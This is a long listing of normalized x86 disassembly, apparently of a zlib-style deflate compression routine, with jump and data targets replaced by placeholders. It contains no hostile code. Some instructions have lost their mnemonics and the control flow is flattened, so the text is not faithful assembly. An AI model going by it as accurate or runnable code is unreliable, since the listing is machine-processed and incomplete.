mov eax edi
mov [ ecx + eax ] dl
mov edx [ esi + 0x14 ]
mov ecx [ esi + 0x1c ]
inc edx
mov [ esi + 0x14 ] edx
mov eax edx
mov edx [ ecx + 0x4 ]
mov ecx [ esi + 0x8 ]
shr edx 0x8
mov [ ecx + eax ] dl
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x1c ]
inc eax
mov [ esi + 0x14 ] eax
mov ecx [ edx + 0x4 ]
mov edx [ esi + 0x8 ]
shr ecx 0x10
mov [ edx + eax ] cl
mov edx [ esi + 0x14 ]
mov ecx [ esi + 0x1c ]
inc edx
mov [ esi + 0x14 ] edx
mov eax edx
mov edx [ ecx + 0x4 ]
mov ecx [ esi + 0x8 ]
shr edx 0x18
mov [ ecx + eax ] dl
mov edi [ esi + 0x14 ]
mov eax [ esi + 0x84 ]
inc edi
cmp eax 0x9
mov [ esi + 0x14 ] edi
mov ecx edi
jne r-xdata
mov edx [ esi + 0x8 ]
mov [ edx + edi ] al
mov edi [ esi + 0x14 ]
mov ecx [ esi + 0x8 ]
inc edi
mov eax edi
mov [ esi + 0x14 ] edi
mov [ ecx + eax ] 0x0
mov edx [ esi + 0x14 ]
inc edx
mov [ esi + 0x14 ] edx
mov eax edx
mov edx [ esi + 0x8 ]
mov [ edx + eax ] 0x0
mov ecx [ esi + 0x14 ]
inc ecx
mov [ esi + 0x14 ] ecx
mov eax ecx
mov ecx [ esi + 0x8 ]
mov [ ecx + eax ] 0x0
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x8 ]
inc eax
mov [ esi + 0x14 ] eax
mov [ edx + eax ] 0x0
mov edi [ esi + 0x14 ]
mov eax [ esi + 0x84 ]
inc edi
cmp eax 0x9
mov [ esi + 0x14 ] edi
mov ecx edi
jne r-xdata
cmp [ esi + 0x4 ] 0x67
jne r-xdata
mov eax [ esi + 0x1c ]
mov ecx [ eax + 0x24 ]
test ecx ecx
je r-xdata
mov [ esi + 0x4 ] 0x5b
mov edx [ esi + 0x14 ]
mov eax [ esi + 0x1c ]
mov edx [ eax + 0x2c ]
test edx edx
je r-xdata
mov eax [ esi + 0x14 ]
mov edi [ esi + 0xc ]
cmp eax edi
jne r-xdata
mov eax ecx
xor edx edx
mov edi 0x1f
mov [ esi + 0x4 ] 0x71
div edi
sub ecx edx
add ecx edi
push ecx
push esi
call sub_1000a9a0
mov eax [ esi + 0x6c ]
add esp 0x8
test eax eax
je r-xdata
or ecx 0x20
cmp eax 0x6
jge r-xdata
cmp [ esi + 0x88 ] ebx
jge r-xdata
mov eax ebx
jmp r-xdata
cmp [ esi + 0x88 ] ebx
jge r-xdata
mov eax ebx
jmp r-xdata
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax [ esi + 0x1c ]
mov ecx [ eax + 0x2c ]
test ecx ecx
je r-xdata
mov [ esi + 0x4 ] 0x67
mov edx [ esi + 0x14 ]
mov edi [ esi + 0x1c ]
mov ecx [ esi + 0x20 ]
xor ebx ebx
inc ecx
mov edi [ edi + 0x1c ]
mov bl [ edi + ecx - 0x1 ]
mov [ esi + 0x20 ] ecx
mov ecx [ esi + 0x8 ]
mov [ ecx + eax ] bl
mov ecx [ esi + 0x14 ]
inc ecx
test ebx ebx
mov [ esi + 0x14 ] ecx
je r-xdata
mov ecx [ esi + 0x1c ]
mov edi [ ecx + 0x2c ]
test edi edi
je r-xdata
mov ecx [ esi + 0x1c ]
mov edx [ esi + 0x20 ]
cmp edx [ ecx + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ecx
jbe r-xdata
mov edx [ esi + 0x1c ]
mov edi [ esi + 0x20 ]
mov ebx [ esi + 0x8 ]
mov edx [ edx + 0x10 ]
mov dl [ edx + edi ]
mov [ ebx + eax ] dl
mov edx [ esi + 0x14 ]
mov eax [ esi + 0x20 ]
inc edx
mov [ esi + 0x14 ] edx
mov edx [ esi + 0x1c ]
inc eax
mov [ esi + 0x20 ] eax
mov edi [ edx + 0x14 ]
and edi 0xffff
cmp eax edi
jb r-xdata
mov edi [ edx + 0x2c ]
test edi edi
je r-xdata
push 0x0
push 0x0
push 0x0
call sub_1000b900
add esp 0xc
mov [ ebp + 0x30 ] eax
mov eax [ ebp + 0x30 ]
shr eax 0x10
push eax
push esi
call sub_1000a9a0
mov ecx [ ebp + 0x30 ]
and ecx 0xffff
push ecx
push esi
call sub_1000a9a0
add esp 0x10
xor edx edx
cmp eax 0x6
setne dl
add edx ebx
mov eax edx
jmp r-xdata
mov eax 0x1
jmp r-xdata
mov eax 0x4
cmp eax ebx
jl r-xdata
mov edx [ esi + 0x8 ]
mov [ edx + ecx ] al
mov ebx [ esi + 0x14 ]
mov ecx [ esi + 0x1c ]
mov edx [ esi + 0x8 ]
inc ebx
mov [ esi + 0x14 ] ebx
mov cl [ ecx + 0xc ]
mov eax ebx
mov [ edx + eax ] cl
mov edi [ esi + 0x14 ]
mov eax [ esi + 0x1c ]
inc edi
mov [ esi + 0x14 ] edi
mov ecx edi
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
mov eax 0x4
cmp eax ebx
jl r-xdata
mov edx [ esi + 0x8 ]
mov [ edx + ecx ] al
mov ecx [ esi + 0x14 ]
inc ecx
mov [ esi + 0x14 ] ecx
mov eax ecx
mov ecx [ esi + 0x8 ]
mov [ ecx + eax ] 0xb
mov eax [ esi + 0x14 ]
inc eax
mov [ esi + 0x4 ] 0x71
mov [ esi + 0x14 ] eax
jmp r-xdata
mov eax [ ebp + 0x4 ]
test eax eax
jne r-xdata
push ebp
call sub_1000a9d0
mov eax [ ebp + 0x10 ]
add esp 0x4
test eax eax
jne r-xdata
mov [ esi + 0x4 ] 0x71
mov ecx [ esi + 0x14 ]
mov eax [ esi + 0xc ]
add ecx 0x2
cmp ecx eax
jbe r-xdata
mov edi [ esi + 0x1c ]
mov ecx [ esi + 0x20 ]
xor ebx ebx
inc ecx
mov edi [ edi + 0x24 ]
mov bl [ edi + ecx - 0x1 ]
mov [ esi + 0x20 ] ecx
mov ecx [ esi + 0x8 ]
mov [ ecx + eax ] bl
mov ecx [ esi + 0x14 ]
inc ecx
test ebx ebx
mov [ esi + 0x14 ] ecx
je r-xdata
mov ecx [ esi + 0x1c ]
mov edi [ ecx + 0x2c ]
test edi edi
je r-xdata
mov eax [ esi + 0x1c ]
mov ecx [ eax + 0x2c ]
test ecx ecx
je r-xdata
jmp r-xdata
push ebp
call sub_1000a9d0
mov eax [ esi + 0x14 ]
mov ecx [ esi + 0xc ]
add esp 0x4
cmp eax ecx
mov edx eax
je r-xdata
cmp eax edx
jbe r-xdata
mov [ esi + 0x20 ] 0x0
mov edx [ esi + 0x8 ]
sub eax ecx
push eax
mov eax [ ebp + 0x30 ]
add edx ecx
push edx
push eax
call sub_1000d6f0
add esp 0xc
mov [ ebp + 0x30 ] eax
push ebp
call sub_1000a9d0
mov eax [ esi + 0x14 ]
mov edx [ esi + 0xc ]
add esp 0x4
cmp eax edx
mov ecx eax
je r-xdata
cmp eax ecx
jbe r-xdata
shl eax 0x6
or ecx eax
mov eax [ esi + 0x6c ]
test eax eax
je r-xdata
mov edx [ esi + 0x1c ]
mov eax [ edx + 0x2c ]
test eax eax
je r-xdata
mov edx [ esi + 0x8 ]
mov al [ eax + 0x14 ]
mov [ edx + ecx ] al
mov edx [ esi + 0x14 ]
mov ecx [ esi + 0x1c ]
inc edx
mov [ esi + 0x14 ] edx
mov eax edx
mov edx [ ecx + 0x14 ]
mov ecx [ esi + 0x8 ]
shr edx 0x8
mov [ ecx + eax ] dl
mov eax [ esi + 0x14 ]
inc eax
mov [ esi + 0x14 ] eax
mov ecx eax
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
mov edi [ esp + 0x18 ]
mov edi [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
cmp edi eax
jg r-xdata
mov [ esi + 0x28 ] 0xffffffff
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov eax [ esi + 0x14 ]
mov ecx [ esi + 0xc ]
lea edx [ eax + 0x2 ]
cmp edx ecx
ja r-xdata
push ebp
call sub_1000a9d0
add esp 0x4
mov eax [ esi + 0x1c ]
mov ecx [ eax + 0x2c ]
test ecx ecx
je r-xdata
jmp r-xdata
push ebp
call sub_1000a9d0
mov eax [ esi + 0x14 ]
mov ecx [ esi + 0xc ]
add esp 0x4
cmp eax ecx
mov edx eax
je r-xdata
cmp eax edx
jbe r-xdata
test ebx ebx
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax edx
jbe r-xdata
mov eax [ esi + 0x14 ]
mov ecx [ esi + 0xc ]
cmp eax ecx
jne r-xdata
mov ebx 0x1
mov ecx [ ebp + 0x30 ]
sub eax edx
push eax
mov eax [ esi + 0x8 ]
add eax edx
push eax
push ecx
call sub_1000d6f0
add esp 0xc
mov [ ebp + 0x30 ] eax
mov edx [ esi + 0x8 ]
sub eax ecx
push eax
mov eax [ ebp + 0x30 ]
add edx ecx
push edx
push eax
call sub_1000d6f0
add esp 0xc
mov [ ebp + 0x30 ] eax
mov [ esi + 0x20 ] 0x0
mov [ esi + 0x4 ] 0x45
jmp r-xdata
mov eax [ esi + 0x8 ]
push ecx
mov ecx [ ebp + 0x30 ]
push eax
push ecx
call sub_1000d6f0
add esp 0xc
mov [ ebp + 0x30 ] eax
test ecx ecx
jne r-xdata
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ ebp + 0x4 ]
cmp eax 0x29a
jne r-xdata
cmp edi 0x4
je r-xdata
mov ecx [ esi + 0x8 ]
mov dl [ ebp + 0x30 ]
push 0x0
push 0x0
mov [ ecx + eax ] dl
mov edi [ esi + 0x14 ]
mov edx [ esi + 0x8 ]
inc edi
mov [ esi + 0x14 ] edi
mov ecx [ ebp + 0x30 ]
mov eax edi
push 0x0
shr ecx 0x8
mov [ edx + eax ] cl
mov eax [ esi + 0x14 ]
inc eax
mov [ esi + 0x14 ] eax
call sub_1000d6f0
add esp 0xc
mov [ ebp + 0x30 ] eax
test ebx ebx
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax edx
jbe r-xdata
mov eax [ esi + 0x14 ]
mov ecx [ esi + 0xc ]
cmp eax ecx
jne r-xdata
mov ebx 0x1
mov ecx [ ebp + 0x30 ]
sub eax edx
push eax
mov eax [ esi + 0x8 ]
add eax edx
push eax
push ecx
call sub_1000d6f0
add esp 0xc
mov [ ebp + 0x30 ] eax
mov [ esi + 0x20 ] ebx
mov ecx [ esi + 0x8 ]
sub eax edx
add ecx edx
mov edx [ ebp + 0x30 ]
push eax
push ecx
push edx
call sub_1000d6f0
add esp 0xc
mov [ ebp + 0x30 ] eax
mov eax [ esi + 0x84 ]
push edi
push esi
lea edx [ eax + eax * 2 ]
call [ edx * 4 + r--data ]
add esp 0x8
cmp eax 0x2
je r-xdata
mov ecx [ esi + 0x74 ]
test ecx ecx
jne r-xdata
mov ecx [ r--data ]
pop edi
mov [ ebp + 0x18 ] ecx
pop esi
pop ebp
mov eax 0xfffffffb
pop ebx
retn
mov eax [ r--data ]
pop edi
mov [ ebp + 0x18 ] eax
pop esi
pop ebp
mov eax 0xfffffffb
pop ebx
retn
mov ecx [ esi + 0x8 ]
sub eax edx
add ecx edx
mov edx [ ebp + 0x30 ]
push eax
push ecx
push edx
call sub_1000d6f0
add esp 0xc
mov [ ebp + 0x30 ] eax
mov [ esi + 0x4 ] 0x29a
cmp eax 0x3
jne r-xdata
test edi edi
je r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
cmp eax 0x2
je r-xdata
test eax eax
je r-xdata
cmp edi 0x4
je r-xdata
cmp eax 0x29a
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov [ esi + 0x28 ] 0xffffffff
cmp eax 0x1
jne r-xdata
mov eax [ esi + 0x18 ]
test eax eax
jg r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
cmp edi eax
jne r-xdata
cmp eax 0x2
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
push 0x0
push 0x0
push 0x0
push esi
call sub_1000bc60
add esp 0x10
cmp edi 0x3
jne r-xdata
push esi
call sub_1000bd00
add esp 0x4
jmp r-xdata
mov eax [ ebp + 0x30 ]
shr eax 0x10
push eax
push esi
call sub_1000a9a0
mov ecx [ ebp + 0x30 ]
and ecx 0xffff
push ecx
push esi
call sub_1000a9a0
add esp 0x10
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x14 ]
mov dl [ ebp + 0x30 ]
mov [ eax + ecx ] dl
mov edi [ esi + 0x14 ]
mov edx [ esi + 0x8 ]
inc edi
mov [ esi + 0x14 ] edi
mov ecx [ ebp + 0x30 ]
mov eax edi
shr ecx 0x8
mov [ edx + eax ] cl
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x8 ]
inc eax
mov [ esi + 0x14 ] eax
mov ecx [ ebp + 0x30 ]
shr ecx 0x10
mov [ edx + eax ] cl
mov edi [ esi + 0x14 ]
mov edx [ esi + 0x8 ]
inc edi
mov [ esi + 0x14 ] edi
mov ecx [ ebp + 0x30 ]
mov eax edi
shr ecx 0x18
mov [ edx + eax ] cl
mov ebx [ esi + 0x14 ]
mov ecx [ esi + 0x8 ]
inc ebx
mov [ esi + 0x14 ] ebx
mov dl [ ebp + 0x8 ]
mov eax ebx
mov [ ecx + eax ] dl
mov edi [ esi + 0x14 ]
mov edx [ esi + 0x8 ]
inc edi
mov [ esi + 0x14 ] edi
mov ecx [ ebp + 0x8 ]
mov eax edi
shr ecx 0x8
mov [ edx + eax ] cl
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x8 ]
inc eax
mov [ esi + 0x14 ] eax
mov ecx [ ebp + 0x8 ]
shr ecx 0x10
mov [ edx + eax ] cl
mov edi [ esi + 0x14 ]
mov edx [ esi + 0x8 ]
inc edi
mov [ esi + 0x14 ] edi
mov ecx [ ebp + 0x8 ]
mov eax edi
shr ecx 0x18
mov [ edx + eax ] cl
mov eax [ esi + 0x14 ]
inc eax
mov [ esi + 0x14 ] eax
jmp r-xdata
push ebp
call sub_1000a9d0
mov eax [ ebp + 0x10 ]
add esp 0x4
test eax eax
jne r-xdata
mov eax [ esi + 0x4c ]
mov ecx [ esi + 0x44 ]
mov [ ecx + eax * 2 - 0x2 ] 0x0
mov edx [ esi + 0x4c ]
mov edi [ esi + 0x44 ]
xor eax eax
lea ecx [ edx + edx - 0x2 ]
mov edx ecx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov ecx [ esi + 0x14 ]
xor eax eax
pop edi
pop esi
test ecx ecx
pop ebp
pop ebx
sete al
retn
neg eax
mov [ esi + 0x18 ] eax
push ebp
call sub_1000a9d0
mov eax [ esi + 0x18 ]
add esp 0x4
test eax eax
jle r-xdata
mov edi [ esp + 0x18 ]
mov [ esi + 0x28 ] 0xffffffff
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
sub_1000a9a0
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
push esi
push edi
mov esi [ eax + 0x8 ]
mov edi [ eax + 0x14 ]
mov edx ecx
shr edx 0x8
mov [ esi + edi ] dl
mov edx [ eax + 0x14 ]
mov esi [ eax + 0x8 ]
inc edx
mov [ eax + 0x14 ] edx
pop edi
mov [ esi + edx ] cl
mov ecx [ eax + 0x14 ]
inc ecx
pop esi
mov [ eax + 0x14 ] ecx
retn
sub_1000a9d0
mov eax [ esp + 0x4 ]
push esi
mov esi [ eax + 0x1c ]
mov ecx [ eax + 0x10 ]
mov edx [ esi + 0x14 ]
cmp edx ecx
jbe r-xdata
test edx edx
je r-xdata
mov edx ecx
pop esi
retn
mov esi [ esi + 0x10 ]
mov ecx edx
push ebx
mov ebx ecx
push edi
mov edi [ eax + 0xc ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov edi [ eax + 0xc ]
mov ecx [ eax + 0x1c ]
add edi edx
mov [ eax + 0xc ] edi
mov esi [ ecx + 0x10 ]
add esi edx
mov [ ecx + 0x10 ] esi
mov ebx [ eax + 0x14 ]
mov edi [ eax + 0x10 ]
mov ecx [ eax + 0x1c ]
add ebx edx
sub edi edx
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] edi
mov esi [ ecx + 0x14 ]
pop edi
sub esi edx
pop ebx
mov [ ecx + 0x14 ] esi
mov eax [ eax + 0x1c ]
mov ecx [ eax + 0x14 ]
test ecx ecx
jne r-xdata
mov ecx [ eax + 0x8 ]
mov [ eax + 0x10 ] ecx
sub_1000aa50
push esi
mov esi [ esp + 0x8 ]
test esi esi
push edi
je r-xdata
pop edi
mov eax 0xfffffffe
pop esi
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
mov edi [ eax + 0x4 ]
cmp edi 0x2a
je r-xdata
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
cmp edi 0x45
je r-xdata
mov ecx [ esi + 0x1c ]
mov eax [ ecx + 0x44 ]
test eax eax
je r-xdata
push eax
mov eax [ esi + 0x28 ]
push eax
call [ esi + 0x24 ]
add esp 0x8
cmp edi 0x49
je r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x40 ]
test eax eax
je r-xdata
mov edx [ esi + 0x28 ]
push eax
push edx
call [ esi + 0x24 ]
add esp 0x8
cmp edi 0x5b
je r-xdata
mov edx [ esi + 0x1c ]
mov eax [ edx + 0x38 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x28 ]
push eax
push ecx
call [ esi + 0x24 ]
add esp 0x8
cmp edi 0x67
je r-xdata
mov ecx [ esi + 0x1c ]
mov edx [ esi + 0x28 ]
push ecx
push edx
call [ esi + 0x24 ]
add esp 0x8
xor eax eax
cmp edi 0x71
mov [ esi + 0x1c ] 0x0
setne al
dec eax
pop edi
and al 0xfd
pop esi
retn
push eax
mov eax [ esi + 0x28 ]
push eax
call [ esi + 0x24 ]
add esp 0x8
cmp edi 0x71
je r-xdata
cmp edi 0x29a
jne r-xdata
sub_1000ab10
mov edx [ esp + 0x4 ]
push ebx
push esi
xor esi esi
mov eax [ edx + 0x2c ]
mov ecx [ edx + 0x4c ]
shl eax 0x1
mov [ edx + 0x3c ] eax
mov eax [ edx + 0x44 ]
push edi
mov [ eax + ecx * 2 - 0x2 ] si
mov ecx [ edx + 0x4c ]
mov edi [ edx + 0x44 ]
xor eax eax
lea ecx [ ecx + ecx - 0x2 ]
mov ebx ecx
shr ecx 0x2
[ edi ]
mov ecx ebx
and ecx 0x3
[ edi ]
mov eax [ edx + 0x84 ]
xor ecx ecx
pop edi
lea eax [ eax + eax * 2 ]
shl eax 0x2
mov cx [ eax + r--data ]
mov [ edx + 0x80 ] ecx
xor ecx ecx
mov cx [ eax + r--data ]
mov [ edx + 0x8c ] ecx
xor ecx ecx
mov cx [ eax + r--data ]
mov [ edx + 0x90 ] ecx
xor ecx ecx
mov cx [ eax + r--data ]
mov [ edx + 0x6c ] esi
mov [ edx + 0x5c ] esi
mov [ edx + 0x74 ] esi
mov eax 0x2
mov [ edx + 0x68 ] esi
mov [ edx + 0x48 ] esi
pop esi
mov [ edx + 0x7c ] ecx
mov [ edx + 0x78 ] eax
mov [ edx + 0x60 ] eax
pop ebx
retn
sub_1000abb0
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
mov ebx 0xffff
mov eax [ esi + 0xc ]
add eax 0xfffffffb
cmp eax ebx
jae r-xdata
mov ebp [ esp + 0x14 ]
mov ebx eax
mov ecx [ esi + 0x6c ]
mov [ esi + 0x74 ] 0x0
add ecx eax
mov [ esi + 0x6c ] ecx
mov ecx [ esi + 0x5c ]
mov edx [ esi + 0x6c ]
lea eax [ ecx + ebx ]
je r-xdata
push esi
call sub_1000ad10
mov eax [ esi + 0x74 ]
add esp 0x4
test eax eax
jne r-xdata
sub edx eax
mov [ esi + 0x6c ] eax
test ecx ecx
mov [ esi + 0x74 ] edx
jl r-xdata
cmp edx eax
jb r-xdata
test ebp ebp
je r-xdata
xor edx edx
mov edx [ esi + 0x38 ]
add edx ecx
jmp r-xdata
mov ecx [ esi + 0x5c ]
mov edx [ esi + 0x6c ]
mov eax [ esi + 0x2c ]
sub edx ecx
sub eax 0x106
cmp edx eax
jb r-xdata
pop esi
pop ebp
xor eax eax
pop ebx
retn
test eax eax
je r-xdata
sub eax ecx
push 0x0
push eax
push edx
push esi
call sub_1000bf60
mov ecx [ esi ]
mov eax [ esi + 0x6c ]
push ecx
mov [ esi + 0x5c ] eax
call sub_1000a9d0
mov edx [ esi ]
add esp 0x14
mov eax [ edx + 0x10 ]
test eax eax
je r-xdata
mov eax [ esi + 0x74 ]
cmp eax 0x1
ja r-xdata
test ecx ecx
jl r-xdata
mov ecx [ esi + 0x5c ]
test ecx ecx
jl r-xdata
xor eax eax
mov eax [ esi + 0x38 ]
add eax ecx
jmp r-xdata
xor eax eax
mov eax [ esi + 0x38 ]
add eax ecx
jmp r-xdata
jmp r-xdata
push 0x0
push edx
push eax
push esi
call sub_1000bf60
mov edx [ esi ]
mov ecx [ esi + 0x6c ]
push edx
mov [ esi + 0x5c ] ecx
call sub_1000a9d0
mov eax [ esi ]
add esp 0x14
mov ecx [ eax + 0x10 ]
test ecx ecx
je r-xdata
mov eax ebp
pop esi
sub eax 0x4
pop ebp
neg eax
sbb eax eax
pop ebx
and al 0xfe
add eax 0x3
retn
xor eax eax
cmp ebp 0x4
setne al
dec eax
pop esi
pop ebp
and eax 0x2
pop ebx
retn
xor edx edx
cmp ebp 0x4
sete dl
push edx
mov edx [ esi + 0x6c ]
sub edx ecx
push edx
push eax
push esi
call sub_1000bf60
mov ecx [ esi ]
mov eax [ esi + 0x6c ]
push ecx
mov [ esi + 0x5c ] eax
call sub_1000a9d0
mov edx [ esi ]
add esp 0x14
mov eax [ edx + 0x10 ]
test eax eax
jne r-xdata
sub_1000ad10
push ebx
mov ebx [ esp + 0x8 ]
push ebp
push esi
mov ebp [ ebx + 0x2c ]
push edi
mov eax [ ebx ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov edi [ ebx + 0x38 ]
mov ecx ebp
mov eax ecx
lea esi [ edi + ebp ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov esi [ ebx + 0x70 ]
mov ecx [ ebx + 0x6c ]
mov eax [ ebx + 0x5c ]
sub esi ebp
sub ecx ebp
mov [ ebx + 0x70 ] esi
mov esi [ ebx + 0x4c ]
mov [ ebx + 0x6c ] ecx
mov ecx [ ebx + 0x44 ]
sub eax ebp
mov [ ebx + 0x5c ] eax
lea ecx [ ecx + esi * 2 ]
pop edi
pop esi
pop ebp
pop ebx
retn
mov ecx [ ebx + 0x74 ]
mov esi [ ebx + 0x6c ]
push edx
mov edx [ ebx + 0x38 ]
add ecx esi
add ecx edx
push ecx
push eax
call sub_1000ae20
mov ecx [ ebx + 0x74 ]
add esp 0xc
add ecx eax
mov esi ecx
mov [ ebx + 0x74 ] ecx
cmp esi 0x3
jb r-xdata
xor eax eax
sub eax ebp
jmp r-xdata
cmp esi 0x106
jae r-xdata
mov edx [ ebx + 0x6c ]
mov eax [ ebx + 0x38 ]
mov ecx [ ebx + 0x58 ]
lea edi [ edx + eax ]
xor eax eax
mov al [ edi ]
mov [ ebx + 0x48 ] eax
shl eax cl
xor ecx ecx
mov cl [ edi + 0x1 ]
xor eax ecx
mov ecx [ ebx + 0x54 ]
and eax ecx
mov [ ebx + 0x48 ] eax
sub ecx 0x2
xor eax eax
mov ax [ ecx ]
cmp eax ebp
jb r-xdata
mov eax [ ebx + 0x40 ]
mov esi ebp
lea ecx [ eax + ebp * 2 ]
dec esi
mov [ ecx ] ax
jne r-xdata
mov edx [ ebx ]
mov eax [ edx + 0x4 ]
test eax eax
jne r-xdata
xor eax eax
sub eax ebp
jmp r-xdata
mov edx [ ebx + 0x3c ]
mov ecx [ ebx + 0x74 ]
mov eax [ ebx + 0x6c ]
sub edx ecx
mov ecx [ ebx + 0x2c ]
sub edx eax
lea ecx [ ecx + ebp - 0x106 ]
cmp eax ecx
jb r-xdata
sub ecx 0x2
xor eax eax
mov ax [ ecx ]
cmp eax ebp
jb r-xdata
add edx ebp
dec esi
mov [ ecx ] ax
jne r-xdata
sub_1000ae20
mov ecx [ esp + 0xc ]
push ebx
mov ebx [ esp + 0x8 ]
push ebp
mov eax [ ebx + 0x4 ]
mov ebp eax
cmp ebp ecx
jbe r-xdata
test ebp ebp
jne r-xdata
mov ebp ecx
sub eax ebp
mov [ ebx + 0x4 ] eax
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x18 ]
cmp eax 0x1
jne r-xdata
pop ebp
xor eax eax
pop ebx
retn
cmp eax 0x2
jne r-xdata
mov ecx [ ebx ]
mov edx [ ebx + 0x30 ]
push ebp
push ecx
push edx
call sub_1000b900
jmp r-xdata
mov ecx ebp
push esi
mov esi [ ebx ]
mov edx ecx
push edi
mov edi [ esp + 0x18 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebx + 0x8 ]
mov ecx [ ebx ]
add eax ebp
add ecx ebp
mov [ ebx + 0x8 ] eax
pop edi
mov eax ebp
pop esi
mov [ ebx ] ecx
pop ebp
pop ebx
retn
mov eax [ ebx ]
mov ecx [ ebx + 0x30 ]
push ebp
push eax
push ecx
call sub_1000d6f0
add esp 0xc
mov [ ebx + 0x30 ] eax
sub_1000aeb0
push ecx
push ebp
push esi
mov esi [ esp + 0x10 ]
push edi
xor edi edi
cmp eax 0x3
jb r-xdata
push esi
call sub_1000ad10
mov eax [ esi + 0x74 ]
add esp 0x4
cmp eax 0x106
jae r-xdata
test edi edi
je r-xdata
mov eax [ esi + 0x48 ]
mov ecx [ esi + 0x58 ]
mov edx [ esi + 0x6c ]
mov edi [ esi + 0x38 ]
shl eax cl
xor ecx ecx
mov cl [ edi + edx + 0x2 ]
mov edi [ esi + 0x34 ]
and edi edx
mov edx [ esi + 0x40 ]
xor eax ecx
mov ecx [ esi + 0x54 ]
and eax ecx
mov ecx [ esi + 0x44 ]
mov [ esi + 0x48 ] eax
mov ax [ ecx + eax * 2 ]
mov [ edx + edi * 2 ] ax
mov ecx [ esi + 0x6c ]
mov eax [ esi + 0x34 ]
mov edx [ esi + 0x40 ]
and ecx eax
mov eax [ esi + 0x48 ]
xor edi edi
mov di [ edx + ecx * 2 ]
mov ecx [ esi + 0x44 ]
mov dx [ esi + 0x6c ]
mov [ ecx + eax * 2 ] dx
test eax eax
je r-xdata
mov ecx [ esp + 0x18 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x60 ]
cmp eax 0x3
jb r-xdata
mov eax [ esi + 0x6c ]
mov ecx [ esi + 0x2c ]
sub eax edi
sub ecx 0x106
cmp eax ecx
ja r-xdata
mov ecx [ esi + 0x5c ]
test ecx ecx
jl r-xdata
pop edi
pop esi
xor eax eax
pop ebp
pop ecx
retn
mov edx [ esi + 0x6c ]
mov eax [ esi + 0x38 ]
mov ecx [ esi + 0x16a0 ]
mov al [ edx + eax ]
mov edx [ esi + 0x16a4 ]
mov [ esp + 0xc ] al
mov [ edx + ecx * 2 ] 0x0
mov ecx [ esi + 0x1698 ]
mov edx [ esi + 0x16a0 ]
mov [ ecx + edx ] al
mov eax [ esp + 0xc ]
mov ebp [ esi + 0x16a0 ]
and eax 0xff
inc ebp
xor edx edx
lea eax [ esi + eax * 4 + 0x94 ]
mov [ esi + 0x16a0 ] ebp
inc [ eax ]
mov ecx [ esi + 0x169c ]
mov ebp [ esi + 0x16a0 ]
dec ecx
cmp ebp ecx
mov ecx [ esi + 0x74 ]
sete dl
dec ecx
mov ebp edx
mov [ esi + 0x74 ] ecx
mov edx [ esi + 0x16a0 ]
mov ebp [ esi + 0x16a4 ]
mov cl al
mov ax [ esi + 0x6c ]
sub ax [ esi + 0x70 ]
sub cl 0x3
mov [ esp + 0x14 ] cl
mov [ ebp + edx * 2 ] ax
mov edx [ esi + 0x1698 ]
mov ebp [ esi + 0x16a0 ]
add eax 0xffff
mov [ edx + ebp ] cl
mov edx [ esi + 0x16a0 ]
mov ecx [ esp + 0x14 ]
inc edx
mov [ esi + 0x16a0 ] edx
and ecx 0xff
xor edx edx
mov dl [ ecx + r--data ]
inc [ esi + edx * 4 + 0x498 ]
cmp ax 0x100
lea ecx [ esi + edx * 4 + 0x498 ]
jae r-xdata
mov ecx [ esi + 0x88 ]
cmp ecx 0x2
je r-xdata
xor eax eax
mov eax [ esi + 0x38 ]
add eax ecx
jmp r-xdata
mov eax [ esi + 0x74 ]
cmp eax 0x106
jae r-xdata
mov ecx [ esi + 0x5c ]
test ecx ecx
jl r-xdata
and eax 0xffff
shr eax 0x7
xor edx edx
mov dl [ eax + r--data ]
mov eax edx
and eax 0xffff
xor ecx ecx
mov cl [ eax + r--data ]
mov eax ecx
jmp r-xdata
cmp ecx 0x3
jne r-xdata
cmp ecx 0x3
je r-xdata
mov eax [ esp + 0x18 ]
pop edi
sub eax 0x4
pop esi
neg eax
sbb eax eax
pop ebp
and al 0xfe
add eax 0x3
pop ecx
retn
mov esi ebp
xor eax eax
cmp esi 0x4
pop edi
setne al
dec eax
pop esi
and eax 0x2
pop ebp
pop ecx
retn
mov ebp [ esp + 0x18 ]
xor edx edx
cmp ebp 0x4
sete dl
push edx
mov edx [ esi + 0x6c ]
sub edx ecx
push edx
push eax
push esi
call sub_1000bf60
mov ecx [ esi ]
mov eax [ esi + 0x6c ]
push ecx
mov [ esi + 0x5c ] eax
call sub_1000a9d0
mov edx [ esi ]
add esp 0x14
